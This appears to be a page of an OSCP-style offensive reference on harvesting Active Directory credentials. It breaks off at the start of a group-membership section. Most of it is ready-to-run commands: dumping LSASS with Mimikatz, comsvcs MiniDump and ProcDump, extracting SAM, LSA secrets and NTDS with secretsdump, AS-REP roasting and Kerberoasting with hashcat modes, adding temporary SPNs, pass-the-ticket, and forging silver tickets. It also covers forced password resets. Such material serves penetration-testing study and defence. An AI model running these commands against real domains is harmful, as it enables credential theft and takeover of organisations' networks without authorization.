# Gain a more useful domain identity

[Overview](../START.canvas) · [Browser map](../Map.html)

Choose a credential source or object transition by its prerequisites. Track the exact account, credential type and compatible service after every transition. Conditional AD CS/delegation/GPO branches require their own complete enabling chain.

## ad-lsass

### Obtain accessible live logon-session credential material

**Enter:** A controlled Windows host may hold useful logged-on identities

**Discovery**

```text
whoami /all
query user
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
```

**Interpret:** A useful session is a possible source, while PPL/protection can prevent the chosen process-memory access.

**Still check:** Verify actual privilege, fresh useful sessions, process/architecture compatibility and protection; prefer accessible tickets when sufficient.

**Verify:** Tie each artifact to an account, source/logon session and material type; independently validate any useful reuse.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/ad-identities/#ad-lsass)

### Full procedure and variants

| Source | What it can contain | Typical prerequisite | Result is not automatically |
| --- | --- | --- | --- |
| Current ticket cache | TGTs and service tickets for the current logon session | Current user; other LUIDs normally require elevation | A password, NT hash or authorization to every service |
| LSASS memory/dump | Logon-session NTLM/AES/DPAPI material and tickets, depending on OS/protection/logon type | Administrator/SYSTEM, suitable debug/dump access, compatible architecture | Guaranteed cleartext or every user's reusable secret |
| SAM + SYSTEM | Local account password hashes | Administrator/SYSTEM/backup-capable access to matched hives | Domain-account material |
| SECURITY + SYSTEM | LSA secrets, service/machine secrets, cached domain verifiers | Administrator/SYSTEM/backup-capable access to matched hives | Directly passable cached-domain hashes |
| Credential Manager/DPAPI | Targeted saved credentials and protected application data | Suitable user/machine context plus master-key material | Plaintext merely because a blob/file is readable |
| NTDS + SYSTEM | Domain account hashes/keys from a DC database | DC-level file access and matched boot-key material | Ordinary member-server admin access |
| DRS replication | Selected domain-account secrets | Effective replication rights at the domain root | Local admin, DC service access or Domain Users membership |

```cmd
whoami /all
tasklist /fi "imagename eq lsass.exe"
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v LsaCfgFlags
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard /v LsaCfgFlags
```

```powershell
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard |
  Select-Object SecurityServicesConfigured,SecurityServicesRunning,VirtualizationBasedSecurityStatus
```

Interpretation:

- membership in Administrators with a medium-integrity filtered token is not equivalent to an elevated process;
- `SeDebugPrivilege` must be present and usable for common live-process access;
- a missing registry value is not definitive proof that a protection is disabled because defaults, policy and firmware state matter;
- LSA protection blocks untrusted code injection/process-memory access; Credential Guard isolates selected NTLM, Kerberos and saved-domain secrets with VBS;
- EDR/AV can block a tool or dump path without proving the underlying credential source is empty.

An access-denied or empty result disproves only that method in the current context.

##### Direct Mimikatz access

```text
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets
```

Decisive output is a named logon session with a typed value: NTLM, AES key, DPAPI key or ticket. A username with `Password : (null)` is not a failed tool run when another useful field exists, and modern Windows commonly does not retain reusable cleartext.

##### Dump first, parse offline

Built-in `comsvcs.dll` method from an elevated command prompt:

```cmd
for /f "tokens=2" %A in ('tasklist ^| findstr /i lsass.exe') do rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump %A C:\Windows\Temp\lsass.dmp full
```

Sysinternals ProcDump alternative:

```cmd
procdump64.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp
```

Parse with a compatible Mimikatz build:

```text
mimikatz.exe
sekurlsa::minidump C:\Path\To\lsass.dmp
sekurlsa::logonpasswords
sekurlsa::tickets
```

Common failures:

- dump creation denied: token/protection/EDR or process-access prerequisite failed;
- `ProcessorArchitecture` mismatch: use compatible x64/x86 tooling;
- OS major-version mismatch: parse with a compatible build/environment;
- dump succeeds but secrets are absent: logon type, sign-out/reboot, Credential Guard and provider behavior affect contents.

LSASS dumps are sensitive and noisy. Hash the evidence if needed, transfer through the established route, store it privately and remove the target copy after the authorized objective.

```powershell
Get-ComputerInfo | Select-Object DeviceGuardSecurityServicesConfigured,DeviceGuardSecurityServicesRunning
```

Credential Guard can isolate reusable domain secrets from ordinary LSASS memory. It does not erase local SAM, file, vault, DPAPI, ticket, service-configuration or directory-right paths. One failed dump method disproves only that method and context. Intrusive SSP interception changes system state and waits for a future logon; it is not the default Block 5 response.

### Follow the evidence

- [ Recover or reuse an NT password hash](credentials.md#nt-hash) — An NT verifier from an appropriate credential source Required: Correct account/domain and actual NT hash; recovery mode or an accepting NTLM service with required destination rights
- [ Classify tickets and use a compatible cache](credentials.md#ticket-use) — A ccache/kirbi file or an existing ticket cache Required: Correct principal/realm, valid lifetime, service scope, compatible cache format and naming/KDC route
- [ Extract local account hashes from matched SAM and SYSTEM](ad-identities.md#ad-sam) — Protected local registry material is available under sufficient host privilege Required: Matched SAM/SYSTEM from the same system and appropriate read/backup access
- [ Parse an offline domain database or select a justified remote collection path](ad-identities.md#ad-ntds) — An already controlled DC or a validated privileged domain collection context Required: Matched NTDS/SYSTEM for offline parsing, or the specific remote protocol/host/replication rights required by the chosen method
## ad-sam

### Extract local account hashes from matched SAM and SYSTEM

**Enter:** Protected local registry material is available under sufficient host privilege

**Discovery**

```text
hostname
whoami /priv
```

**Interpret:** Sufficient source access suggests local-account extraction, not domain-account extraction.

**Still check:** Verify a supported backup/read operation, complete same-host hives and offline parser context.

**Verify:** Verify source machine, matched hive pair and account/RID mapping; validate destination rights separately.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/ad-identities/#ad-sam)

### Full procedure and variants

```cmd
reg save HKLM\SAM C:\Windows\Temp\SAM.hive /y
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive /y
```

```bash
impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL
```

Mimikatz alternative from a suitable elevated context:

```text
privilege::debug
token::elevate
lsadump::sam
```

Interpret a typical account row as:

```text
LOCAL_USER:RID:LM_HASH:NT_HASH:::
```

The NT hash is local-account material. Its reuse depends on the same local password existing elsewhere, account state, remote UAC restrictions, service support and host authorization. Return it to the credential-classification workflow; do not call it a domain credential.

### Follow the evidence

- [ Recover or reuse an NT password hash](credentials.md#nt-hash) — An NT verifier from an appropriate credential source Required: Correct account/domain and actual NT hash; recovery mode or an accepting NTLM service with required destination rights
- [ Select password, NT hash, key-to-ticket or ticket authentication](lateral-movement.md#move-auth-material) — A password, actual NT hash, AES/NT long-term key or ticket is available Required: Credential type accepted by the chosen protocol/client, correct identity/domain, naming/time and destination authorization
- [ Classify the artifact and its identity context](credentials.md#credential-classify) — A secret-like value, key file, stored hash, challenge response or ticket Required: Artifact provenance and format; possible local/domain/application identity and compatible protocol
- [ Extract LSA secrets and cached-domain verifiers](ad-identities.md#ad-security) — Matched SECURITY/SYSTEM material is accessible Required: Appropriate host/read privilege and complete matching key/source files
## ad-security

### Extract LSA secrets and cached-domain verifiers

**Enter:** Matched SECURITY/SYSTEM material is accessible

**Discovery**

```text
hostname
whoami /priv
```

**Interpret:** A SECURITY source targets secrets/cached verifiers with distinct semantics; it is not simply another SAM.

**Still check:** Confirm matched key material and classify every returned service/machine secret or DCC2 record.

**Verify:** Retain source, account, type and required factors; do not label every parsed output a Pass-the-Hash credential.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/ad-identities/#ad-security)

### Full procedure and variants

```cmd
reg save HKLM\SECURITY C:\Windows\Temp\SECURITY.hive /y
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive /y
```

```bash
impacket-secretsdump -security SECURITY.hive -system SYSTEM.hive LOCAL
```

Mimikatz alternative:

```text
privilege::debug
token::elevate
lsadump::secrets
lsadump::cache
```

Potential categories:

- `$MACHINE.ACC`: member computer's domain-account secret/key material;
- service/autologon secrets: usefulness depends on whether the service/account remains active;
- `NL$1`-style cached logon data: DCC2/MSCache v2 verifier material.

DCC2 is for offline guessing, not Pass-the-Hash:

```bash
hashcat -m 2100 dcc2.hashes wordlist.txt -r /usr/share/hashcat/rules/best64.rule
```

Verify the exact format with the installed Hashcat examples before cracking.

### Follow the evidence

- [ Recover a password from cached domain logon verifiers](credentials.md#dcc2-recovery) — A DCC2/MSCache record from matched SECURITY/SYSTEM material Required: Correct username/salt/iteration context and feasible offline candidates
- [ Validate known passwords and context-specific reuse](credentials.md#credential-use) — A password tied to a plausible user and service Required: Correct local/domain/application identity, reachable compatible service, accepted authentication and account state
- [ Classify the artifact and its identity context](credentials.md#credential-classify) — A secret-like value, key file, stored hash, challenge response or ticket Required: Artifact provenance and format; possible local/domain/application identity and compatible protocol
## ad-dpapi

### Use Credential Manager and DPAPI with the protecting context

**Enter:** Saved credentials or protected application blobs/master keys

**Discovery**

```text
whoami /user
cmdkey /list
```

**Interpret:** The target and protecting SID identify which keys/context or consumer must be investigated.

**Still check:** Check matching master keys/recovery factors or an allowed saved-credential consumer; file read alone is insufficient.

**Verify:** Verify the decrypted value or actual saved-credential action in its matching context.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/ad-identities/#ad-dpapi)

### Full procedure and variants

```cmd
cmdkey /list
vaultcmd /list
vaultcmd /listcreds:"Windows Credentials" /all
```

```powershell
Get-ChildItem "$env:APPDATA\Microsoft\Credentials" -Force -ErrorAction SilentlyContinue
Get-ChildItem "$env:LOCALAPPDATA\Microsoft\Credentials" -Force -ErrorAction SilentlyContinue
Get-ChildItem "$env:APPDATA\Microsoft\Protect" -Force -Recurse -ErrorAction SilentlyContinue
```

For each entry record target, type, username, persistence/context and whether a compatible application can ask Windows to use it. A listed credential is not necessarily exportable plaintext.

DPAPI reasoning:

```text
PROTECTED BLOB
-> MASTER-KEY GUID
-> USER OR MACHINE PROTECT SCOPE
-> MASTER-KEY DECRYPTION MATERIAL
-> APPLICATION-SPECIFIC DECODING
```

Possible decryption material includes the already logged-on user context, the user's password/NT hash, machine context or a domain DPAPI backup key. Prefer using the authorized existing context rather than copying unrelated protected data. One blob without its master key/context is incomplete.

### Follow the evidence

- [ Classify the artifact and its identity context](credentials.md#credential-classify) — A secret-like value, key file, stored hash, challenge response or ticket Required: Artifact provenance and format; possible local/domain/application identity and compatible protocol
- [ Validate known passwords and context-specific reuse](credentials.md#credential-use) — A password tied to a plausible user and service Required: Correct local/domain/application identity, reachable compatible service, accepted authentication and account state
- [ Recover Windows application, history and stored-credential artifacts](windows-privesc.md#windows-secrets) — Readable application configuration, unattended setup, PowerShell trails or Credential Manager entries Required: Artifact read permission and exact protecting identity/context for saved or DPAPI material
## ad-ntds

### Parse an offline domain database or select a justified remote collection path

**Enter:** An already controlled DC or a validated privileged domain collection context

**Discovery**

```text
file NTDS.dit SYSTEM.save
```

**Interpret:** A database/key pair is an offline source candidate; remote DRS requires a different permission chain.

**Still check:** Verify same-source consistency and access, or independently validate the exact replication/remote collection prerequisites.

**Verify:** Verify source consistency, account mapping and the exact collection method; retain sensitive output privately.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/ad-identities/#ad-ntds)

### Full procedure and variants

##### Offline NTDS from an already controlled DC

An offline parse needs a matched `NTDS.dit` and SYSTEM hive:

```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM.hive LOCAL
```

Obtaining locked DC database files normally requires DC-level privilege and a snapshot/backup-aware method. Ordinary local administrator on a member server does not provide this material.

##### Remote collection

```bash
impacket-secretsdump -dc-ip DC_IP 'DOMAIN/USER:PASSWORD@DC_HOST'
```

```bash
impacket-secretsdump -hashes :NT_HASH -dc-ip DC_IP 'DOMAIN/USER@DC_HOST'
```

This broad form can invoke several remote collection paths and is high impact. Use it only when the lab objective and privileges justify those sources. For replication rights and a bounded one-user request, use [DCSync](https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise.md#dcsync-replication-rights).

### Follow the evidence

- [ Use validated directory replication rights for bounded credential proof](ad-identities.md#ad-dcsync) — A principal has the relevant effective replication rights at the domain naming context Required: Required replication extended rights, DC RPC connectivity and correct domain identity; access to a member server is insufficient
- [ Recover or reuse an NT password hash](credentials.md#nt-hash) — An NT verifier from an appropriate credential source Required: Correct account/domain and actual NT hash; recovery mode or an accepting NTLM service with required destination rights
- [ Classify the artifact and its identity context](credentials.md#credential-classify) — A secret-like value, key file, stored hash, challenge response or ticket Required: Artifact provenance and format; possible local/domain/application identity and compatible protocol
- [ Conditional: understand a realm-wide TGT forgery from KRBTGT material](ad-identities.md#kerberos-golden) — An already compromised domain exposes a KRBTGT key and domain SID Required: Correct KRBTGT cryptographic material, realm/SID/principal data, valid ticket parameters and compatible service/KDC validation behavior
## kerberos-asrep

### Request AS-REP material for an account without preauthentication

**Enter:** A known user or directory flag indicates Kerberos preauthentication is disabled

**Discovery**

```text
Get-DomainUser -Properties samaccountname,useraccountcontrol |
  Select-Object samaccountname,@{n='UAC';e={[int]$_.useraccountcontrol}} |
  Where-Object { ($_.UAC -band 0x400000) -ne 0 }
```

**Interpret:** The DONT_REQUIRE_PREAUTH bit is set. Test the bit, not equality to one whole decimal value, because other flags coexist.

**Still check:** Check account state, KDC route, response/encryption type and feasible recovery; no-password discovery requires a real known username.

**Verify:** Verify the account, realm, response format/encryption type and recovered credential if cracking succeeds.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/ad-identities/#kerberos-asrep)

### Full procedure and variants

##### Why AS-REP roasting works

Ordinary Kerberos preauthentication makes the user prove knowledge of the long-term key before the KDC returns AS-REP material. If the account has `DONT_REQUIRE_PREAUTH`, an unauthenticated requester can ask for an AS-REP whose encrypted component can be tested offline against password candidates.

```text
KNOWN USERNAME + PREAUTH DISABLED + KDC REACHABLE
-> AS-REP CIPHER
-> OFFLINE GUESSING
-> PASSWORD ONLY IF A CANDIDATE VERIFIES
```

##### One known user, no password

```bash
impacket-GetNPUsers 'DOMAIN/TARGET_USER' -no-pass -request \
  -dc-ip DC_IP -outputfile asrep-TARGET_USER.hashes
```

##### Supplied user list, no password

```bash
impacket-GetNPUsers 'DOMAIN/' -no-pass -request -usersfile users.txt \
  -dc-ip DC_IP -outputfile asrep.hashes
```

##### Authenticated directory-backed discovery

```bash
impacket-GetNPUsers 'DOMAIN/USER' -request \
  -dc-ip DC_IP -outputfile asrep.hashes
```

Omitting the password from the target lets the tool prompt rather than storing it in shell history.

##### Windows/Rubeus alternative

```cmd
Rubeus.exe asreproast /user:TARGET_USER /domain:DOMAIN /dc:DC_HOST /outfile:asrep.hashes /format:hashcat
```

##### Interpret before cracking

| Output | Meaning | Next action |
| --- | --- | --- |
| `$krb5asrep$23$` | RC4 AS-REP offline verifier | Hashcat mode 18200 |
| AS-REP with another etype | Different cipher/format | Match the exact prefix to installed Hashcat/John support |
| `KDC_ERR_C_PRINCIPAL_UNKNOWN` | User/realm not found | Recheck spelling, realm and DC |
| Preauthentication required / no `UF_DONT_REQUIRE_PREAUTH` | Account is not roastable through this method | Disprove this path for that account |
| Timeout/name error | KDC route/DNS problem | Fix route/FQDN/time before account conclusions |

```bash
hashcat -m 18200 asrep.hashes wordlist.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 18200 asrep.hashes --show
```

Do not call the account compromised because a hash was captured. Only a verified offline candidate produces a password, and that password still needs identity/access mapping.

### Follow the evidence

- [ Recover passwords with feasible dictionary, rule and mask attacks](credentials.md#offline-recovery) — A supported stored verifier or converted protected artifact Required: Correct format/mode, complete salt/context, justified candidates and an available offline tool/backend
- [ Validate known passwords and context-specific reuse](credentials.md#credential-use) — A password tied to a plausible user and service Required: Correct local/domain/application identity, reachable compatible service, accepted authentication and account state
- [ Request a selected service ticket for offline service-account recovery](ad-identities.md#kerberos-roast) — A user-owned SPN and a useful service-account relationship Required: A valid domain authentication/TGT context, reachable KDC, target SPN and a feasible password/encryption candidate strategy
## kerberos-roast

### Request a selected service ticket for offline service-account recovery

**Enter:** A user-owned SPN and a useful service-account relationship

**Discovery**

```text
Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname,memberof
```

**Interpret:** A user-owned SPN supplies the account key targeted by a service ticket and a reason to assess password-recovery feasibility.

**Still check:** Verify valid KDC context, selected account/SPN, returned encryption type, password model and useful resulting rights.

**Verify:** Record SPN/account/encryption type and verify any recovered password against the intended identity.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/ad-identities/#kerberos-roast)

### Full procedure and variants

##### Why Kerberoasting works

Any valid domain identity can normally request a service ticket for an SPN. The ticket is encrypted with key material belonging to the SPN account, allowing offline password guessing.

```text
VALID DOMAIN IDENTITY + SPN ACCOUNT + KDC ROUTE
-> TGS-REP CIPHER
-> OFFLINE GUESSING
-> SERVICE-ACCOUNT PASSWORD IF A CANDIDATE VERIFIES
```

Rank SPN accounts before requesting tickets: group/ACL value, service/host, account type, password age, enabled state and resulting access matter more than collecting every ticket.

##### Enumerate without requesting tickets

```bash
impacket-GetUserSPNs -dc-ip DC_IP 'DOMAIN/USER'
```

```cmd
Rubeus.exe kerberoast /stats /domain:DOMAIN /dc:DC_HOST
```

##### Request one selected user

```bash
impacket-GetUserSPNs -request-user TARGET_USER -dc-ip DC_IP \
  -outputfile kerberoast-TARGET_USER.hashes 'DOMAIN/USER'
```

```cmd
Rubeus.exe kerberoast /user:TARGET_USER /domain:DOMAIN /dc:DC_HOST /outfile:kerberoast.hashes
```

<details>
<summary><strong>Request all mapped candidates</strong></summary>

```bash
impacket-GetUserSPNs -request -dc-ip DC_IP \
  -outputfile kerberoast.hashes 'DOMAIN/USER'
```

```cmd
Rubeus.exe kerberoast /domain:DOMAIN /dc:DC_HOST /outfile:kerberoast.hashes
```

Use broad requests only when scope and the candidate inventory justify them. Prefer one ranked account during verification.

</details>

##### Hash type and cracking

| Prefix | Kerberos etype | Hashcat mode |
| --- | ---: | ---: |
| `$krb5tgs$23$` | RC4-HMAC | 13100 |
| `$krb5tgs$17$` | AES128 | 19600 |
| `$krb5tgs$18$` | AES256 | 19700 |

```bash
hashcat -m 13100 kerberoast.hashes wordlist.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 19600 kerberoast-aes128.hashes wordlist.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 19700 kerberoast-aes256.hashes wordlist.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m MODE HASH_FILE --show
```

Select the mode from the actual prefix and current `hashcat --example-hashes`; do not assume every TGS is RC4. AES material is still an offline verifier but generally costs more per guess. Cracking feasibility is governed mainly by password strength and candidates, not merely ticket acquisition.

##### Common failures

- no SPNs returned: wrong domain/base/authentication context, filtering or no user SPNs;
- `KDC_ERR_S_PRINCIPAL_UNKNOWN`: SPN is absent/malformed or queried in the wrong realm;
- `KDC_ERR_ETYPE_NOSUPP`: requested cipher conflicts with account/domain policy;
- output wraps or fails to load: save directly to an output file and verify prefix/line integrity;
- crack exhausts candidates: password not represented by the tested model; the account is not therefore “secure.”

### Follow the evidence

- [ Recover passwords with feasible dictionary, rule and mask attacks](credentials.md#offline-recovery) — A supported stored verifier or converted protected artifact Required: Correct format/mode, complete salt/context, justified candidates and an available offline tool/backend
- [ Validate known passwords and context-specific reuse](credentials.md#credential-use) — A password tied to a plausible user and service Required: Correct local/domain/application identity, reachable compatible service, accepted authentication and account state
- [ Validate host access and volatile session candidates](ad-mapping.md#domain-hosts) — Group-to-host access edges or a privileged user's possible session Required: Reachable destination service and its actual authorization; session evidence must be current and collection rights sufficient
## ad-targeted-roast

### Create a temporary SPN through an effective object right

**Enter:** A controlled principal can write a user's servicePrincipalName

**Discovery**

```text
Get-DomainUser -Identity TARGET_USER -Properties serviceprincipalname
Get-DomainObjectAcl -Identity TARGET_USER -ResolveGUIDs
```

**Interpret:** A specific writable SPN property on a useful user can create a ticket-request opportunity.

**Still check:** Verify trustee/effective property scope, enabled account, unique temporary SPN, KDC context and exact restoration.

**Verify:** Verify effective right, requested account and cleanup; confirm any recovered credential independently.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/ad-identities/#ad-targeted-roast)

### Full procedure and variants

If Block 10 proved effective write access to a user object's `servicePrincipalName`, an SPN can be temporarily added, requested and removed. This is a state-changing directory attack and must preserve original state.

Built-in SPN operations:

```cmd
setspn -L TARGET_USER
setspn -S temporary/TARGET_USER TARGET_USER
```

Request only that account:

```bash
impacket-GetUserSPNs -request-user TARGET_USER -dc-ip DC_IP \
  -outputfile targeted-TARGET_USER.hashes 'DOMAIN/USER'
```

Cleanup:

```cmd
setspn -D temporary/TARGET_USER TARGET_USER
setspn -L TARGET_USER
```

The controlled right must apply to the SPN attribute, `-S` must not collide with an existing SPN, and cleanup is part of the procedure. A recovered password is still validated and mapped as a new identity.

If the effective right permits writing `servicePrincipalName` on a user, add a unique temporary SPN, request that account's ticket and remove the SPN immediately. The cracking workflow is in [Kerberos and identity transitions](https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/reference/06-ad-lateral-movement/03-kerberos-and-identity-transitions.md).

```powershell
setspn -S TEMP/TARGET_USER TARGET_USER
setspn -Q TEMP/TARGET_USER
Rubeus.exe kerberoast /user:TARGET_USER /outfile:TARGET_USER.tgs /format:hashcat
setspn -D TEMP/TARGET_USER TARGET_USER
```

### Follow the evidence

- [ Recover passwords with feasible dictionary, rule and mask attacks](credentials.md#offline-recovery) — A supported stored verifier or converted protected artifact Required: Correct format/mode, complete salt/context, justified candidates and an available offline tool/backend
- [ Validate known passwords and context-specific reuse](credentials.md#credential-use) — A password tied to a plausible user and service Required: Correct local/domain/application identity, reachable compatible service, accepted authentication and account state
- [ Validate effective directory-object control](ad-mapping.md#domain-acl) — An ACL/graph edge names GenericAll, GenericWrite, WriteDacl, WriteOwner or an extended/property right Required: Effective trustee membership, target object/type, inheritance/deny behavior and the exact permitted operation
## kerberos-tickets

### Inventory, convert and import tickets in the correct logon context

**Enter:** A valid ticket/cache or a long-term key that can request a TGT

**Discovery**

```text
klist
```

**Interpret:** A current TGT can request appropriate service tickets if the KDC/name route and account context work.

**Still check:** Distinguish TGT from TGS, format, logon-session scope, lifetime, SPN and destination authorization.

**Verify:** Verify ticket client/server/lifetime and an actual service operation; record local versus network identity separately.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/ad-identities/#kerberos-tickets)

### Full procedure and variants

```cmd
klist
klist tgt
klist sessions
klist -li 0xLUID tickets
klist -li 0xLUID tgt
Rubeus.exe triage
Rubeus.exe dump /luid:0xLUID /nowrap
```

> Do not run `klist purge` during triage.

| Field/pattern | Interpretation | Decision |
| --- | --- | --- |
| `Client: USER @ REALM` | Identity represented | Map that exact user/computer and realm |
| Client ending in `$` | Computer identity | Establish machine-account rights; do not treat as a human user |
| `Server: krbtgt/REALM` | TGT | Can request service tickets while valid, within that client's authorization |
| `Server: cifs/HOST` | CIFS service ticket | Only SMB/CIFS on the named host; authorization still applies |
| `Server: ldap/DC_HOST` | LDAP service ticket | LDAP authentication, not replication rights |
| Other `SERVICE/HOST` | Ticket for that SPN | Use matching hostname/service/client |
| `Start/End/Renew Time` | Validity windows | Import cannot revive an expired/not-yet-valid ticket |
| Ticket flags | Kerberos behavior/history | Not evidence of privilege |
| `Kdc Called` | Issuing KDC | Not evidence of access to that DC |
| Encryption/session key | Compatibility/policy clue | Not privilege or password strength |

Linux cache:

```bash
klist -c ticket.ccache
export KRB5CCNAME="$PWD/ticket.ccache"
```

Convert only when a client expects the other container:

```bash
impacket-ticketConverter ticket.kirbi ticket.ccache
impacket-ticketConverter ticket.ccache ticket.kirbi
```

These commands establish a local ticket context. Block 12 selects and validates the remote service.

Windows/Rubeus:

```cmd
Rubeus.exe ptt /ticket:ticket.kirbi
klist
```

Windows/Mimikatz:

```text
kerberos::ptt ticket.kirbi
kerberos::list
```

Linux:

```bash
export KRB5CCNAME="$PWD/ticket.ccache"
klist
```

NT hash or AES key to a TGT:

```cmd
Rubeus.exe asktgt /user:USER /domain:DOMAIN /rc4:NT_HASH /dc:DC_HOST /ptt
klist
```

Use `/aes128:` or `/aes256:` when that is the actual key type and tool version supports it. RC4-based requests can fail where RC4 is disabled even though the NT hash is correct.

Mimikatz creates a new process using supplied key material:

```text
sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:NT_HASH /run:cmd.exe
```

This is a credential/ticket-context transition, not proof that a destination accepts the identity.

```cmd
klist
klist tgt
klist sessions
```

When privileges permit inspecting another logon session:

```cmd
klist -li 0xLUID tickets
klist -li 0xLUID tgt
```

```cmd
Rubeus.exe triage
Rubeus.exe dump /luid:0xLUID /nowrap
```

> Do not use `klist purge` during triage. It destroys cached tickets and can break the current session. Interpret exported tickets using [Kerberos and identity transitions](https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/reference/06-ad-lateral-movement/03-kerberos-and-identity-transitions.md#6-ticket-inventory-classification-and-conversion).

### Follow the evidence

- [ Select password, NT hash, key-to-ticket or ticket authentication](lateral-movement.md#move-auth-material) — A password, actual NT hash, AES/NT long-term key or ticket is available Required: Credential type accepted by the chosen protocol/client, correct identity/domain, naming/time and destination authorization
- [ Execute through uploaded service creation using PsExec](lateral-movement.md#move-services) — A destination grants administrative-share write and service-control rights Required: SMB/SCM reachability, writable required share, effective service-creation/start rights and an accepted password/hash or supported Kerberos context
- [ Preserve DNS, Kerberos names and time across a pivot](pivoting.md#pivot-dns) — An IP connection works while hostname/Kerberos access fails Required: Reachable correct resolver/KDC path, matching target SPN/hostname, realm configuration and acceptable time
- [ Forge a service-scoped ticket from the correct service key](ad-identities.md#kerberos-silver) — A service account key and a concrete compatible service/SPN objective Required: Correct service key/encryption type, domain SID, principal/SPN data and service validation behavior; modern PAC/KDC validation can constrain use
## kerberos-silver

### Forge a service-scoped ticket from the correct service key

**Enter:** A service account key and a concrete compatible service/SPN objective

**Discovery**

```text
setspn -Q SERVICE/TARGET_HOST
whoami /user
klist
```

**Interpret:** The key must protect the intended service ticket; an arbitrary user's NT hash is not sufficient.

**Still check:** Verify key type/current value, domain SID, principal/SPN, validation behavior and accepted target action.

**Verify:** Prove the intended service action and ticket context; ticket creation/import success alone is insufficient.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/ad-identities/#kerberos-silver)

### Full procedure and variants

> **Prerequisite:** key/hash of the account encrypting the target SPN's tickets, domain SID, exact SPN/service/host, a plausible existing domain identity and compatible target-service validation behavior.

Linux/Impacket:

```bash
impacket-ticketer -nthash SERVICE_NT_HASH -domain-sid DOMAIN_SID \
  -domain DOMAIN -spn cifs/TARGET_HOST AUTHORIZED_TEST_USER
export KRB5CCNAME="$PWD/AUTHORIZED_TEST_USER.ccache"
klist
```

Windows/Mimikatz:

```text
kerberos::golden /sid:DOMAIN_SID /domain:DOMAIN /target:TARGET_HOST /service:cifs /rc4:SERVICE_NT_HASH /user:AUTHORIZED_TEST_USER /ptt
```

Despite the Mimikatz module name, supplying a service/target key produces a silver/service ticket, not a krbtgt-signed TGT.

Important boundaries:

- the key must belong to the account that owns the SPN; machine-account keys commonly protect host services;
- the ticket is limited to the named service/host and whichever services share the same account key;
- current PAC enforcement means using a nonexistent identity can fail; use a real authorized test identity and validate behavior;
- a service may perform KDC/PAC validation or additional authorization;
- a successfully imported ticket is not successful service access.

Golden tickets require the KRBTGT key and domain SID and create a forged TGT. They are a high-impact persistence concept covered in the [conditional domain-compromise section](https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise.md#conditional-high-impact-ticket-forging-concepts), not a default Block 11 action.

### Follow the evidence

- [ Select password, NT hash, key-to-ticket or ticket authentication](lateral-movement.md#move-auth-material) — A password, actual NT hash, AES/NT long-term key or ticket is available Required: Credential type accepted by the chosen protocol/client, correct identity/domain, naming/time and destination authorization
- [ Enumerate SMB/RPC shares, files and identities](services.md#service-smb) — SMB/RPC endpoints, domain clues or new credentials Required: Reachable SMB/RPC; anonymous, guest, local or domain context must be explicit; share and filesystem ACLs both matter
- [ Classify the artifact and its identity context](credentials.md#credential-classify) — A secret-like value, key file, stored hash, challenge response or ticket Required: Artifact provenance and format; possible local/domain/application identity and compatible protocol
## ad-password-reset

### Reset a target account password through a validated directory right

**Enter:** A controlled trustee has the effective password-reset right on a useful account

**Discovery**

```text
Get-DomainObjectAcl -Identity TARGET_USER -ResolveGUIDs
```

**Interpret:** An applicable reset operation changes a target credential; it does not reveal the old password.

**Still check:** Validate effective membership, protection/account state, account utility and the authorized impact of a disruptive reset.

**Verify:** Verify account identity and compatible authentication, then test relevant authorization.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/ad-identities/#ad-password-reset)

### Full procedure and variants

A password-reset right creates a new password credential; it does not reveal the old one. This is disruptive because an unknown original password cannot be restored.

```powershell
$Secure = ConvertTo-SecureString 'TEMP_PASSWORD' -AsPlainText -Force
Set-DomainUserPassword -Identity TARGET_USER -AccountPassword $Secure -Verbose
net user TARGET_USER TEMP_PASSWORD /domain
```

Validate the account state and authenticate only to an approved service as the target identity. Prefer a reversible route when one exists.

### Follow the evidence

- [ Validate known passwords and context-specific reuse](credentials.md#credential-use) — A password tied to a plausible user and service Required: Correct local/domain/application identity, reachable compatible service, accepted authentication and account state
- [ Validate host access and volatile session candidates](ad-mapping.md#domain-hosts) — Group-to-host access edges or a privileged user's possible session Required: Reachable destination service and its actual authorization; session evidence must be current and collection rights sufficient
- [ Match route, destination service and effective authorization](lateral-movement.md#move-preflight) — A credential appears valid but the destination's usable access is unknown Required: Real source-to-service route, correct identity context and protocol-specific execution/logon rights
## ad-group-control

### Add a controlled identity to a group through effective membership rights

**Enter:** A group member-attribute write or equivalent effective right

**Discovery**

```text
Get-DomainGroupMember -Identity TARGET_GROUP
